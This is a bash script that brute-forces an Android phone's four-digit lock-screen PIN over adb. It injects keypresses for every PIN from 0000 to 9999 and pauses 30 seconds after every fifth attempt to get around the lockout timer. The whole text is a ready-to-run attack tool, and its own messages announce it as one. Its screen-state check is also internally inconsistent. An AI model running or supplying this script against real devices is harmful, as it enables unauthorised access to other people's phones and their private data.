screen="$(adb shell dumpsys activity|grep -i mCurrentFocus|awk 'NR==1{print $3}'|cut -d'}' -f1)"
case $screen in
    "mScreenState=OFF") echo -e "Preparing to attack."; 
        echo -e "All Has Been Set" ;;
    "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
esac
echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
adb shell input keyevent 3
adb shell input keyevent 82
adb shell input swipe 407 1211 378 85
while true
do
    for i in {0000..9999}; do
        if [[ $i != 1036 ]]; then
            echo -e "\e[0;1mTrying pin:  $i\e[0m"
            for (( j=0; j<${#i}; j++ )); do
                adb shell input keyevent $((`echo ${i:$j:1}`+7))
            done
            adb shell input keyevent 66
            adb shell input keyevent 3
            if ! (( `expr $i + 1` % 5 )); then
                adb shell input keyevent 66
                sleep 30
                adb shell input keyevent 3
                adb shell input swipe 407 1211 378 85
            fi
        fi
    done
done